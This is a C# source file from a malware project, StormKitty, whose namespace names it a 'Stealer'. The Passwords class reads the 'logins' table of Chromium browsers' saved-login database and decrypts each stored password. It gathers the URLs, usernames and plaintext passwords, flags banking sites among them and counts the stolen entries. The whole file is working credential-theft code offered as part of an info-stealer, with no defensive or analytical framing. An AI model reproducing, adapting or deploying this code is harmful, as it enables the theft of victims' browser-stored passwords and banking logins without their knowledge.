/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.Collections.Generic;

namespace Stealer.Chromium
{
    internal sealed class Passwords
    {
        /// <summary>
        /// Get passwords from chromium based browsers
        /// </summary>
        /// <param name="sLoginData"></param>
        /// <returns>List with passwords</returns>
        public static List<Password> Get(string sLoginData)
        {
            try
            {
                List<Password> pPasswords = new List<Password>();

                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sLoginData, "logins");
                if (sSQLite == null)
                    return pPasswords;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    Password pPassword = new Password();

                    pPassword.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    pPassword.sUsername = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                    string sPassword = sSQLite.GetValue(i, 5);

                    if (sPassword != null)
                    {
                        pPassword.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, sPassword));
                        pPasswords.Add(pPassword);

                        // Analyze value
                        Banking.ScanData(pPassword.sUrl);
                        Counter.Passwords++;
                    }
                    continue;

                }

                return pPasswords;
            }
            catch { return new List<Password>(); }
        }
    }
}
